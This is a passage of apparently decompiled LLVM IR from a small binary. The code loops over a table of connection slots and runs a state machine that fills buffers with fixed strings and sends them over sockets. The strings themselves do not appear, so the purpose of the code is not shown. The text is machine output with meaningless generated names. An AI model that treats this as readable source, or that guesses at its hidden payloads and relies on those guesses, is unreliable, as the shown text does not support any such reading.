  %v4_403974 = urem i32 %v1_403990, 32
  store i32 %v4_403974, i32* %a3.global-to-local, align 4
  br i1 %v2_403974, label %dec_label_pc_403978, label %dec_label_pc_4039a4

dec_label_pc_403978:                              ; preds = %dec_label_pc_40396c
  %v1_40397c = mul nuw nsw i32 %v1_403970, 4
  %v2_403980 = add i32 %v1_40397c, %v2_40396c
  store i32 %v2_403980, i32* %a0.global-to-local, align 4
  %v1_403984 = add i32 %v2_403980, 204
  %v2_403984 = inttoptr i32 %v1_403984 to i32*
  %v3_403984 = load i32, i32* %v2_403984, align 4
  %v2_403988 = shl i32 %v0_403988, %v4_403974
  %v2_40398c = or i32 %v3_403984, %v2_403988
  store i32 %v2_40398c, i32* %v0.global-to-local, align 4
  %v0_403990 = load i32, i32* %s1.global-to-local, align 4
  %v2_403990 = icmp slt i32 %v0_403990, %v1_403990
  %v3_403990 = zext i1 %v2_403990 to i32
  store i32 %v3_403990, i32* %v1.global-to-local, align 4
  %v1_403994 = icmp eq i1 %v2_403990, false
  store i32 %v2_40398c, i32* %v2_403984, align 4
  br i1 %v1_403994, label %dec_label_pc_4039cc, label %dec_label_pc_403998

dec_label_pc_403998:                              ; preds = %dec_label_pc_403978
  %v0_4039a0 = load i32, i32* %a1.global-to-local, align 4
  store i32 %v0_4039a0, i32* %s1.global-to-local, align 4
  %v0_4039a4.pre = load i32, i32* %a0.global-to-local, align 4
  %v1_4039a8.pre = load i32, i32* %v0.global-to-local, align 4
  %v0_4039b4.pre = load i32, i32* %v1.global-to-local, align 4
  %v1_4039b4.pre = load i32, i32* %a3.global-to-local, align 4
  br label %dec_label_pc_4039a4

dec_label_pc_4039a4:                              ; preds = %dec_label_pc_40396c, %dec_label_pc_403998
  %v1_4039bc = phi i32 [ %v1_403990, %dec_label_pc_40396c ], [ %v0_4039a0, %dec_label_pc_403998 ]
  %v1_4039b4 = phi i32 [ %v4_403974, %dec_label_pc_40396c ], [ %v1_4039b4.pre, %dec_label_pc_403998 ]
  %v0_4039b4 = phi i32 [ %v0_403988, %dec_label_pc_40396c ], [ %v0_4039b4.pre, %dec_label_pc_403998 ]
  %v1_4039a8 = phi i32 [ %v2_40396c, %dec_label_pc_40396c ], [ %v1_4039a8.pre, %dec_label_pc_403998 ]
  %v0_4039a4 = phi i32 [ %v1_403970, %dec_label_pc_40396c ], [ %v0_4039a4.pre, %dec_label_pc_403998 ]
  %v1_4039a4 = mul i32 %v0_4039a4, 4
  %v2_4039a8 = add i32 %v1_4039a4, %v1_4039a8
  store i32 %v2_4039a8, i32* %a0.global-to-local, align 4
  %v1_4039ac = add i32 %v2_4039a8, 76
  %v2_4039ac = inttoptr i32 %v1_4039ac to i32*
  %v3_4039ac = load i32, i32* %v2_4039ac, align 4
  store i32 %stack_var_-56.0, i32* %a2.global-to-local, align 4
  %v2_4039b4 = shl i32 %v0_4039b4, %v1_4039b4
  %v2_4039b8 = or i32 %v3_4039ac, %v2_4039b4
  store i32 %v2_4039b8, i32* %v0.global-to-local, align 4
  %v2_4039bc = icmp slt i32 %stack_var_-56.0, %v1_4039bc
  %v3_4039bc = zext i1 %v2_4039bc to i32
  store i32 %v3_4039bc, i32* %v1.global-to-local, align 4
  %v1_4039c0 = icmp eq i1 %v2_4039bc, false
  store i32 %v2_4039b8, i32* %v2_4039ac, align 4
  %v0_4039c8 = load i32, i32* %a1.global-to-local, align 4
  %stack_var_-56.0.v0_4039c8 = select i1 %v1_4039c0, i32 %stack_var_-56.0, i32 %v0_4039c8
  br label %dec_label_pc_4039cc

dec_label_pc_4039cc:                              ; preds = %dec_label_pc_4039a4, %dec_label_pc_403978, %dec_label_pc_40388c, %dec_label_pc_403868
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_403868 ], [ %stack_var_-56.0, %dec_label_pc_40388c ], [ %stack_var_-56.0, %dec_label_pc_403978 ], [ %stack_var_-56.0.v0_4039c8, %dec_label_pc_4039a4 ]
  %v3_4039cc = load i32, i32* %stack_var_-2928, align 4
  %v1_4039d4 = add i32 %v3_4039cc, 1
  store i32 %v1_4039d4, i32* %a0.global-to-local, align 4
  %v1_4039d8 = icmp slt i32 %v1_4039d4, 160
  %v2_4039d8 = zext i1 %v1_4039d8 to i32
  store i32 %v2_4039d8, i32* %v0.global-to-local, align 4
  store i32 %v1_4039d4, i32* %stack_var_-2928, align 4
  br i1 %v1_4039d8, label %dec_label_pc_403868, label %dec_label_pc_4039e0

dec_label_pc_4039e0:                              ; preds = %dec_label_pc_4039cc
  store i32 %stack_var_-56.1, i32* %a0.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  %v1_4039ec = load i32, i32* %s1.global-to-local, align 4
  %v2_4039ec = icmp slt i32 %stack_var_-56.1, %v1_4039ec
  %v3_4039ec = zext i1 %v2_4039ec to i32
  store i32 %v3_4039ec, i32* %v1.global-to-local, align 4
  store i32 1, i32* %stack_var_-2916, align 4
  %v1_4039f4 = icmp eq i1 %v2_4039ec, false
  br i1 %v1_4039f4, label %dec_label_pc_403a00, label %dec_label_pc_4039f8

dec_label_pc_4039f8:                              ; preds = %dec_label_pc_4039e0
  store i32 %v1_4039ec, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403a00

dec_label_pc_403a00:                              ; preds = %dec_label_pc_4039e0, %dec_label_pc_4039f8
  %v0_403a08 = phi i32 [ %stack_var_-56.1, %dec_label_pc_4039e0 ], [ %v1_4039ec, %dec_label_pc_4039f8 ]
  %v0_403a00 = load i32, i32* %gp.global-to-local, align 4
  %v1_403a00 = add i32 %v0_403a00, -32144
  %v2_403a00 = inttoptr i32 %v1_403a00 to i32*
  %v3_403a00 = load i32, i32* %v2_403a00, align 4
  %v2_403a04 = ptrtoint i32* %stack_var_-2916 to i32
  store i32 %v2_403a04, i32* %v0.global-to-local, align 4
  %v1_403a08 = add i32 %v0_403a08, 1
  store i32 %v1_403a08, i32* %a0.global-to-local, align 4
  store i32 %v2_403834, i32* %a1.global-to-local, align 4
  store i32 %v2_403838, i32* @a2, align 4
  store i32 0, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_403a00)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403a28 = load i32, i32* @global_var_449340.219, align 4
  store i32 %v3_403a28, i32* @t9, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  %v3_403a30 = call i32 @function_404fa0(i32* null)
  store i32 %v3_403a30, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 0, i32* %stack_var_-2928, align 4
  %v3_403a40 = load i32, i32* bitcast (i32** @global_var_4494bc.248 to i32*), align 4
  store i32 %v3_403a40, i32* %v1.global-to-local, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  %v2_403a48 = inttoptr i32 %v3_403a40 to i32*
  store i32 %v2_403a04, i32* %v2_403a48, align 4
  %v2_403a9c = ptrtoint i32* %stack_var_-2924 to i32
  %v3_403ab0 = ptrtoint i32* %stack_var_-2920 to i32
  %v7_403b20 = bitcast i32* %stack_var_-2596 to i8*
  %v0_403a4c.pre = load i32, i32* %a0.global-to-local, align 4
  %v1_403cac = add i32 %v1_403164, 287184
  %v2_403cac = inttoptr i32 %v1_403cac to i32*
  br label %dec_label_pc_403a4c

dec_label_pc_403a4c:                              ; preds = %dec_label_pc_403f78, %dec_label_pc_403a00
  %v1_403a58 = phi i32 [ %v1_403f80, %dec_label_pc_403f78 ], [ %v0_403a4c.pre, %dec_label_pc_403a00 ]
  %v1_403a50 = mul i32 %v1_403a58, 64
  store i32 %v1_403a50, i32* %v1.global-to-local, align 4
  %v1_403a5c = mul i32 %v1_403a58, 536
  store i32 %v1_403a5c, i32* %v0.global-to-local, align 4
  %v0_403a60 = load i32, i32* @s6, align 4
  %v2_403a60 = add i32 %v0_403a60, %v1_403a5c
  store i32 %v2_403a60, i32* %s2.global-to-local, align 4
  %v1_403a64 = add i32 %v2_403a60, 8
  %v2_403a64 = inttoptr i32 %v1_403a64 to i32*
  %v3_403a64 = load i32, i32* %v2_403a64, align 4
  store i32 %v3_403a64, i32* %a0.global-to-local, align 4
  %v2_403a6c = icmp eq i32 %v3_403a64, -1
  %v4_403a6c = udiv i32 %v3_403a64, 32
  store i32 %v4_403a6c, i32* %v0.global-to-local, align 4
  br i1 %v2_403a6c, label %dec_label_pc_403f78, label %dec_label_pc_403a70

dec_label_pc_403a70:                              ; preds = %dec_label_pc_403a4c
  %v1_403a74 = mul nuw nsw i32 %v4_403a6c, 4
  %v0_403a78 = load i32, i32* @sp, align 4
  %v2_403a78 = add i32 %v0_403a78, %v1_403a74
  store i32 %v2_403a78, i32* %v0.global-to-local, align 4
  %v1_403a7c = add i32 %v2_403a78, 236
  %v2_403a7c = inttoptr i32 %v1_403a7c to i32*
  %v3_403a7c = load i32, i32* %v2_403a7c, align 4
  %tmp102 = shl i32 1, %v3_403a64
  %v1_403a8812 = and i32 %v3_403a7c, %tmp102
  %v1_403a8c = icmp eq i32 %v1_403a8812, 0
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v1_403a8c, label %dec_label_pc_403e14, label %dec_label_pc_403a90

dec_label_pc_403a90:                              ; preds = %dec_label_pc_403a70
  %v0_403a94 = load i32, i32* %gp.global-to-local, align 4
  %v1_403a94 = add i32 %v0_403a94, -32460
  %v2_403a94 = inttoptr i32 %v1_403a94 to i32*
  %v3_403a94 = load i32, i32* %v2_403a94, align 4
  store i32 4, i32* %stack_var_-2924, align 4
  store i32 %v2_403a9c, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-2920, align 4
  store i32 65535, i32* %a1.global-to-local, align 4
  store i32 4103, i32* @a2, align 4
  store i32 %v3_403ab0, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_403a94)
  %v3_403ab8 = load i32, i32* %stack_var_-2920, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v1_403ac0 = icmp eq i32 %v3_403ab8, 0
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v1_403ac0, label %dec_label_pc_403ac4, label %dec_label_pc_403f3c

dec_label_pc_403ac4:                              ; preds = %dec_label_pc_403a90
  %v0_403ac8 = load i32, i32* @s7, align 4
  %v2_403ac8 = icmp eq i32 %v0_403ac8, 1
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_403ac8, label %dec_label_pc_403acc, label %dec_label_pc_403d6c

dec_label_pc_403acc:                              ; preds = %dec_label_pc_403ac4
  %v0_403ad0 = load i32, i32* %s2.global-to-local, align 4
  %v1_403ad0 = add i32 %v0_403ad0, 17
  %v2_403ad0 = inttoptr i32 %v1_403ad0 to i8*
  %v3_403ad0 = load i8, i8* %v2_403ad0, align 1
  %v4_403ad0 = zext i8 %v3_403ad0 to i32
  store i32 %v4_403ad0, i32* %v1.global-to-local, align 4
  %v1_403ad8 = icmp eq i8 %v3_403ad0, 0
  br i1 %v1_403ad8, label %dec_label_pc_403adc, label %dec_label_pc_403ba4

dec_label_pc_403adc:                              ; preds = %dec_label_pc_403acc
  %v3_403ae0 = load i32, i32* @global_var_44932c.174, align 4
  store i32 %v3_403ae0, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403ae8 = call i32 @function_400c78(i32 21)
  store i32 %v2_403ae8, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %s1.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_40384c, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v4_403b04 = call i32 @function_4042e8(i32 %v2_40384c, i32 0, i32 1024)
  store i32 %v4_403b04, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  %v3_403b18 = load i32, i32* @global_var_4492ec.193, align 4
  store i32 %v3_403b18, i32* @t9, align 4
  store i32 ptrtoint ([619 x i8]* @global_var_408260.265 to i32), i32* %a1.global-to-local, align 4
  %v8_403b20 = call i32 @function_404284(i8* %v7_403b20, i32 ptrtoint ([619 x i8]* @global_var_408260.265 to i32))
  store i32 %v8_403b20, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([195 x i8]* @global_var_4084cc.267 to i32), i32* @a1, align 4
  %v8_403b3c = call i32 @function_404224(i8* %v7_403b20, i32 ptrtoint ([195 x i8]* @global_var_4084cc.267 to i32))
  store i32 %v8_403b3c, i32* @v0, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403b50 = load i32, i32* %s2.global-to-local, align 4
  %v1_403b50 = add i32 %v0_403b50, 8
  %v2_403b50 = inttoptr i32 %v1_403b50 to i32*
  %v3_403b50 = load i32, i32* %v2_403b50, align 4
  store i32 %v3_403b50, i32* @s0, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  %v4_403b54 = call i32 @function_404200(i32 %v2_40384c)
  store i32 %v4_403b54, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a1.global-to-local, align 4
  %v3_403b64 = load i32, i32* @global_var_449420.206, align 4
  store i32 %v3_403b64, i32* @t9, align 4
  store i32 %v4_403b54, i32* %a2.global-to-local, align 4
  %v0_403b6c = load i32, i32* @s0, align 4
  store i32 %v0_403b6c, i32* %a0.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_403b70 = call i32 @function_405940(i32 %v0_403b6c, i32* nonnull %stack_var_-2596, i32 %v4_403b54, i32 16384)
  store i32 %v6_403b70, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403b80 = load i32, i32* @global_var_449404.178, align 4
  store i32 %v3_403b80, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403b88 = call i32 @function_400dc0(i32 21)
  store i32 %v2_403b88, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403b94 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403b94, i32* %a0.global-to-local, align 4
  store i32 4, i32* %a1.global-to-local, align 4
  store i32 5, i32* @a2, align 4
  %v0_403ba4.pre = load i32, i32* @v1, align 4
  %v1_403ba4.pre = load i32, i32* @s7, align 4
  br label %dec_label_pc_403ba4

dec_label_pc_403ba4:                              ; preds = %dec_label_pc_403acc, %dec_label_pc_403adc
  %v1_403ba4 = phi i32 [ 1, %dec_label_pc_403acc ], [ %v1_403ba4.pre, %dec_label_pc_403adc ]
  %v0_403ba4 = phi i32 [ %v4_403ad0, %dec_label_pc_403acc ], [ %v0_403ba4.pre, %dec_label_pc_403adc ]
  %v2_403ba4 = icmp eq i32 %v0_403ba4, %v1_403ba4
  store i32 2, i32* %v0.global-to-local, align 4
  br i1 %v2_403ba4, label %dec_label_pc_403ba8, label %dec_label_pc_403ca4

dec_label_pc_403ba8:                              ; preds = %dec_label_pc_403ba4
  %v3_403bac = load i32, i32* @global_var_44932c.174, align 4
  store i32 %v3_403bac, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403bb4 = call i32 @function_400c78(i32 21)
  store i32 %v2_403bb4, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_40384c, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v4_403bd0 = call i32 @function_4042e8(i32 %v2_40384c, i32 0, i32 1024)
  store i32 %v4_403bd0, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  %v3_403be4 = load i32, i32* @global_var_4492ec.193, align 4
  store i32 %v3_403be4, i32* @t9, align 4
  store i32 ptrtoint ([629 x i8]* @global_var_408590.268 to i32), i32* %a1.global-to-local, align 4
  %v8_403bec = call i32 @function_404284(i8* %v7_403b20, i32 ptrtoint ([629 x i8]* @global_var_408590.268 to i32))
  store i32 %v8_403bec, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  %v1_403c04 = load i32, i32* @fp, align 4
  store i32 %v1_403c04, i32* @a1, align 4
  %v5_403c04 = call i32 @function_404224(i8* %v7_403b20, i32 %v1_403c04)
  store i32 %v5_403c04, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_408808.269 to i32), i32* @a1, align 4
  %v8_403c20 = call i32 @function_404224(i8* %v7_403b20, i32 ptrtoint ([11 x i8]* @global_var_408808.269 to i32))
  store i32 %v8_403c20, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([195 x i8]* @global_var_4084cc.267 to i32), i32* @a1, align 4
  %v8_403c3c = call i32 @function_404224(i8* %v7_403b20, i32 ptrtoint ([195 x i8]* @global_var_4084cc.267 to i32))
  store i32 %v8_403c3c, i32* @v0, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403c50 = load i32, i32* %s2.global-to-local, align 4
  %v1_403c50 = add i32 %v0_403c50, 8
  %v2_403c50 = inttoptr i32 %v1_403c50 to i32*
  %v3_403c50 = load i32, i32* %v2_403c50, align 4
  store i32 %v3_403c50, i32* %s1.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  %v4_403c54 = call i32 @function_404200(i32 %v2_40384c)
  store i32 %v4_403c54, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a1.global-to-local, align 4
  %v3_403c64 = load i32, i32* @global_var_449420.206, align 4
  store i32 %v3_403c64, i32* @t9, align 4
  store i32 %v4_403c54, i32* %a2.global-to-local, align 4
  %v0_403c6c = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_403c6c, i32* %a0.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_403c70 = call i32 @function_405940(i32 %v0_403c6c, i32* nonnull %stack_var_-2596, i32 %v4_403c54, i32 16384)
  store i32 %v6_403c70, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403c80 = load i32, i32* @global_var_449404.178, align 4
  store i32 %v3_403c80, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403c88 = call i32 @function_400dc0(i32 21)
  store i32 %v2_403c88, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403c94 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403c94, i32* %a0.global-to-local, align 4
  store i32 5, i32* %a1.global-to-local, align 4
  store i32 10, i32* @a2, align 4
  %v0_403ca4.pre = load i32, i32* @v1, align 4
  br label %dec_label_pc_403ca4

dec_label_pc_403ca4:                              ; preds = %dec_label_pc_403ba4, %dec_label_pc_403ba8
  %v1_403ca4 = phi i32 [ 2, %dec_label_pc_403ba4 ], [ %v2_403c88, %dec_label_pc_403ba8 ]
  %v0_403ca4 = phi i32 [ %v0_403ba4, %dec_label_pc_403ba4 ], [ %v0_403ca4.pre, %dec_label_pc_403ba8 ]
  %v2_403ca4 = icmp eq i32 %v0_403ca4, %v1_403ca4
  br i1 %v2_403ca4, label %dec_label_pc_403ca8, label %dec_label_pc_403e14

dec_label_pc_403ca8:                              ; preds = %dec_label_pc_403ca4
  %v3_403cac = load i32, i32* %v2_403cac, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403cac)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %s1.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_40384c, i32* @a0, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  %v4_403cd0 = call i32 @function_4042e8(i32 %v2_40384c, i32 0, i32 1024)
  store i32 %v4_403cd0, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  %v3_403ce4 = load i32, i32* @global_var_4492ec.193, align 4
  store i32 %v3_403ce4, i32* @t9, align 4
  store i32 ptrtoint ([621 x i8]* @global_var_408814.271 to i32), i32* %a1.global-to-local, align 4
  %v8_403cec = call i32 @function_404284(i8* %v7_403b20, i32 ptrtoint ([621 x i8]* @global_var_408814.271 to i32))
  store i32 %v8_403cec, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([195 x i8]* @global_var_4084cc.267 to i32), i32* @a1, align 4
  %v8_403d08 = call i32 @function_404224(i8* %v7_403b20, i32 ptrtoint ([195 x i8]* @global_var_4084cc.267 to i32))
  store i32 %v8_403d08, i32* @v0, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403d1c = load i32, i32* %s2.global-to-local, align 4
  %v1_403d1c = add i32 %v0_403d1c, 8
  %v2_403d1c = inttoptr i32 %v1_403d1c to i32*
  %v3_403d1c = load i32, i32* %v2_403d1c, align 4
  store i32 %v3_403d1c, i32* @s0, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  %v4_403d20 = call i32 @function_404200(i32 %v2_40384c)
  store i32 %v4_403d20, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a1.global-to-local, align 4
  %v3_403d30 = load i32, i32* @global_var_449420.206, align 4
  store i32 %v3_403d30, i32* @t9, align 4
  %v0_403d34 = load i32, i32* @s0, align 4
  store i32 %v0_403d34, i32* %a0.global-to-local, align 4
  store i32 %v4_403d20, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_403d3c = call i32 @function_405940(i32 %v0_403d34, i32* nonnull %stack_var_-2596, i32 %v4_403d20, i32 16384)
  store i32 %v6_403d3c, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403d4c = load i32, i32* @global_var_449404.178, align 4
  store i32 %v3_403d4c, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403d54 = call i32 @function_400dc0(i32 21)
  store i32 %v2_403d54, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403d60 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403d60, i32* %a0.global-to-local, align 4
  store i32 6, i32* %a1.global-to-local, align 4
  %v0_403d6c.pre = load i32, i32* @s7, align 4
  br label %dec_label_pc_403d6c

dec_label_pc_403d6c:                              ; preds = %dec_label_pc_403ac4, %dec_label_pc_403ca8
  %v1_403d6c = phi i32 [ 2, %dec_label_pc_403ac4 ], [ %v2_403d54, %dec_label_pc_403ca8 ]
  %v0_403d6c = phi i32 [ %v0_403ac8, %dec_label_pc_403ac4 ], [ %v0_403d6c.pre, %dec_label_pc_403ca8 ]
  %v2_403d6c = icmp eq i32 %v0_403d6c, %v1_403d6c
  br i1 %v2_403d6c, label %dec_label_pc_403d70, label %dec_label_pc_403e14

dec_label_pc_403d70:                              ; preds = %dec_label_pc_403d6c
  %v3_403d74 = load i32, i32* @global_var_44932c.174, align 4
  store i32 %v3_403d74, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403d7c = call i32 @function_400c78(i32 21)
  store i32 %v2_403d7c, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 0, i32* %a1.global-to-local, align 4
  store i32 1024, i32* @a2, align 4
  store i32 %v2_40384c, i32* @a0, align 4
  %v6_403d98 = call i32 @function_4042e8(i32 %v2_40384c, i32 0, i32 1024)
  store i32 %v6_403d98, i32* @v0, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403dac = load i32, i32* %s2.global-to-local, align 4
  %v1_403dac = add i32 %v0_403dac, 8
  %v2_403dac = inttoptr i32 %v1_403dac to i32*
  %v3_403dac = load i32, i32* %v2_403dac, align 4
  store i32 %v3_403dac, i32* %s1.global-to-local, align 4
  store i32 %v2_40384c, i32* %a0.global-to-local, align 4
  %v4_403db0 = call i32 @function_404200(i32 %v2_40384c)
  store i32 %v4_403db0, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  store i32 %v2_40384c, i32* %a1.global-to-local, align 4
  %v3_403dc0 = load i32, i32* @global_var_449420.206, align 4
  store i32 %v3_403dc0, i32* @t9, align 4
  %v0_403dc4 = load i32, i32* %s1.global-to-local, align 4
  store i32 %v0_403dc4, i32* %a0.global-to-local, align 4
  store i32 %v4_403db0, i32* %a2.global-to-local, align 4
  store i32 16384, i32* %a3.global-to-local, align 4
  %v6_403dcc = call i32 @function_405940(i32 %v0_403dc4, i32* nonnull %stack_var_-2596, i32 %v4_403db0, i32 16384)
  store i32 %v6_403dcc, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v3_403ddc = load i32, i32* @global_var_449404.178, align 4
  store i32 %v3_403ddc, i32* @t9, align 4
  store i32 21, i32* %a0.global-to-local, align 4
  %v2_403de4 = call i32 @function_400dc0(i32 21)
  store i32 %v2_403de4, i32* %v0.global-to-local, align 4
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  %v0_403df0 = load i32, i32* %s2.global-to-local, align 4
  store i32 %v0_403df0, i32* %a0.global-to-local, align 4
  store i32 7, i32* %a1.global-to-local, align 4
  store i32 30, i32* @a2, align 4
  %v3_403dfc = load i32, i32* bitcast (i32** @global_var_4491f0.18 to i32*), align 4
  %v1_403e04 = add i32 %v3_403dfc, 12228
  call void @__pseudo_call(i32 %v1_403e04)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403e14

dec_label_pc_403e14:                              ; preds = %dec_label_pc_403d6c, %dec_label_pc_403ca4, %dec_label_pc_403a70, %dec_label_pc_403d70
  %v0_403e14 = load i32, i32* %s2.global-to-local, align 4
  %v1_403e14 = add i32 %v0_403e14, 8
  %v2_403e14 = inttoptr i32 %v1_403e14 to i32*
  %v3_403e14 = load i32, i32* %v2_403e14, align 4
  store i32 %v3_403e14, i32* %v1.global-to-local, align 4
  %v1_403e1c = udiv i32 %v3_403e14, 32
  %v1_403e20 = mul nuw nsw i32 %v1_403e1c, 4
  %v0_403e24 = load i32, i32* @sp, align 4
  %v2_403e24 = add i32 %v0_403e24, %v1_403e20
  store i32 %v2_403e24, i32* %v0.global-to-local, align 4
  %v1_403e28 = add i32 %v2_403e24, 108
  %v2_403e28 = inttoptr i32 %v1_403e28 to i32*
  %v3_403e28 = load i32, i32* %v2_403e28, align 4
  %v2_403e30 = lshr i32 %v3_403e28, %v3_403e14
  %v1_403e34 = urem i32 %v2_403e30, 2
  store i32 %v1_403e34, i32* %v0.global-to-local, align 4
  %v1_403e38 = icmp eq i32 %v1_403e34, 0
  br i1 %v1_403e38, label %dec_label_pc_403f78, label %dec_label_pc_403e3c

dec_label_pc_403e3c:                              ; preds = %dec_label_pc_403e14
  %v1_403e40 = add i32 %v0_403e14, 16
  %v2_403e40 = inttoptr i32 %v1_403e40 to i8*
  %v3_403e40 = load i8, i8* %v2_403e40, align 1
  %v4_403e40 = zext i8 %v3_403e40 to i32
  store i32 %v4_403e40, i32* %v0.global-to-local, align 4
  %v1_403e48 = icmp eq i8 %v3_403e40, 0
  %v3_403e48 = add i32 %v0_403e14, 18
  store i32 %v3_403e48, i32* %a1.global-to-local, align 4
  br i1 %v1_403e48, label %dec_label_pc_403f78, label %dec_label_pc_403e4c

dec_label_pc_403e4c:                              ; preds = %dec_label_pc_403e3c
  %v1_403e50 = add i32 %v0_403e14, 530
  %v2_403e50 = inttoptr i32 %v1_403e50 to i16*
  %v3_403e50 = load i16, i16* %v2_403e50, align 2
  %v4_403e50 = zext i16 %v3_403e50 to i32
  store i32 %v4_403e50, i32* %v0.global-to-local, align 4
  %v0_403e54 = load i32, i32* %s3.global-to-local, align 4
  %v1_403e54 = inttoptr i32 %v0_403e54 to i32*
  store i32 0, i32* %v1_403e54, align 4
  %v0_403e58 = load i32, i32* %gp.global-to-local, align 4
  %v1_403e58 = add i32 %v0_403e58, -32036
  %v2_403e58 = inttoptr i32 %v1_403e58 to i32*
  %v3_403e58 = load i32, i32* %v2_403e58, align 4
  %v0_403e5c = load i32, i32* %s2.global-to-local, align 4
  %v1_403e5c = add i32 %v0_403e5c, 8
  %v2_403e5c = inttoptr i32 %v1_403e5c to i32*
  %v3_403e5c = load i32, i32* %v2_403e5c, align 4
  store i32 %v3_403e5c, i32* %a0.global-to-local, align 4
  %v1_403e64 = load i32, i32* %v0.global-to-local, align 4
  %v2_403e64 = sub i32 512, %v1_403e64
  store i32 %v2_403e64, i32* @a2, align 4
  %v0_403e68 = load i32, i32* %a1.global-to-local, align 4
  %v2_403e68 = add i32 %v0_403e68, %v1_403e64
  store i32 %v2_403e68, i32* %a1.global-to-local, align 4
  store i32 16384, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_403e58)
  store i32 %v2_403164, i32* %gp.global-to-local, align 4
